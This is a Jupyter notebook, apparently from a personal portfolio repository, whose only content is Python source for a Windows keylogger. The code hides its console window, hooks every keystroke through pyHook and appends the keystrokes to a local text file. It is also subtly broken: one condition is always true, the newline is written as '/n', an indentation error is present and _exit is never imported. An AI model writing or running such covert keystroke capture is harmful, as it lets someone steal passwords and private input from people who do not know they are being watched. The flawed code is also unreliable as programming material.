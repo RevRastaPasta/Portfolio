{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa53c89e-f943-4316-8aaa-85b940228535",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Python code for keylogger\n",
    "# to be used in windows\n",
    "import win32api\n",
    "import win32console\n",
    "import win32gui\n",
    "import pythoncom, pyHook"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d5c65c2-a3ec-4638-b7fa-315cc865bcc1",
   "metadata": {},
   "outputs": [],
   "source": [
    "win = win32console.GetConsoleWindow()\n",
    "win32gui.ShowWindow(win, 0)\n",
    "  \n",
    "def OnKeyboardEvent(event):\n",
    "    if event.Ascii==5:\n",
    "        _exit(1)\n",
    "    if event.Ascii !=0 or 8:\n",
    "    #open output.txt to read current keystrokes\n",
    "        f = open('c:\\output.txt', 'r+')\n",
    "        buffer = f.read()\n",
    "        f.close()\n",
    "    # open output.txt to write current + new keystrokes\n",
    "        f = open('c:\\output.txt', 'w')\n",
    "        keylogs = chr(event.Ascii)\n",
    "        if event.Ascii == 13:\n",
    "        keylogs = '/n'\n",
    "        buffer += keylogs\n",
    "        f.write(buffer)\n",
    "        f.close()\n",
    "# create a hook manager object\n",
    "hm = pyHook.HookManager()\n",
    "hm.KeyDown = OnKeyboardEvent\n",
    "# set the hook\n",
    "hm.HookKeyboard()\n",
    "# wait forever\n",
    "pythoncom.PumpMessages()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d39cc5f8-020b-4e2e-a3d4-c34f3eb151d5",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
